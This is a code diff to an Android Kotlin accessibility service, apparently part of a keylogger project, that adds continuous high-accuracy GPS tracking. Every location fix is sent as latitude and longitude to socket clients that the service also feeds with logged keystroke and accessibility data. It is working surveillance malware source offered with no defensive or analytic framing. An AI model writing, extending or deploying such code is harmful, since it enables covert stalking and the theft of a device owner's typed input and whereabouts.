@@ -1,9 +1,19 @@
 package com.example.keylogger
 
+import android.Manifest
 import android.accessibilityservice.AccessibilityService
 import android.annotation.SuppressLint
+import android.content.pm.PackageManager
+import android.os.Looper
 import android.util.Log
 import android.view.accessibility.AccessibilityEvent
+import androidx.core.app.ActivityCompat
+import com.google.android.gms.location.FusedLocationProviderClient
+import com.google.android.gms.location.LocationCallback
+import com.google.android.gms.location.LocationRequest
+import com.google.android.gms.location.LocationResult
+import com.google.android.gms.location.LocationServices
+import com.google.android.gms.location.Priority
 import kotlinx.coroutines.CoroutineScope
 import kotlinx.coroutines.Dispatchers
 import kotlinx.coroutines.SupervisorJob
@@ -17,10 +27,22 @@ import java.util.Date
 
 
 class KeyLogger : AccessibilityService() {
+
+    private lateinit var fusedLocationClient: FusedLocationProviderClient
+    private lateinit var locationCallback: LocationCallback
+    private lateinit var locationRequest: LocationRequest
+
     private val coroutineScope = CoroutineScope(Dispatchers.IO + SupervisorJob())  // Coroutine scope for background tasks
     private val clients = ArrayList<DataOutputStream>()
     override fun onServiceConnected() {
         super.onServiceConnected()
+
+        fusedLocationClient = LocationServices.getFusedLocationProviderClient(this)
+        locationRequest = LocationRequest.Builder(
+            Priority.PRIORITY_HIGH_ACCURACY,
+            10000
+        ).setMinUpdateIntervalMillis(5000)
+            .build()
 
         Log.d("keylogger", "Service Connected")
         try {
@@ -28,6 +50,25 @@ class KeyLogger : AccessibilityService() {
         } catch (e: IOException) {
             throw RuntimeException(e)
         }
+
+        locationCallback = object : LocationCallback() {
+            override fun onLocationResult(locationResult: LocationResult) {
+                for (location in locationResult.locations) {
+                    coroutineScope.launch { sendToClient("Lat: ${location.latitude}, Lng: ${location.longitude}") }
+                }
+            }
+        }
+        if (ActivityCompat.checkSelfPermission(
+                this,
+                Manifest.permission.ACCESS_FINE_LOCATION
+            ) != PackageManager.PERMISSION_GRANTED && ActivityCompat.checkSelfPermission(
+                this,
+                Manifest.permission.ACCESS_COARSE_LOCATION
+            ) != PackageManager.PERMISSION_GRANTED
+        ) {
+            return
+        }
+        fusedLocationClient.requestLocationUpdates(locationRequest ,locationCallback, Looper.getMainLooper())
     }
 
     @SuppressLint("NewApi")
@@ -69,7 +110,11 @@ class KeyLogger : AccessibilityService() {
         Log.d("keylogger", message + " " + clients.size)
         try {
             for (client in clients) {
-                client.writeUTF(message)
+                try{
+                    client.writeUTF(message)
+                }catch (e: Exception) {
+                    e.printStackTrace()
+                }
             }
             Log.d("keylogger", message)
         } catch (e: Exception) {
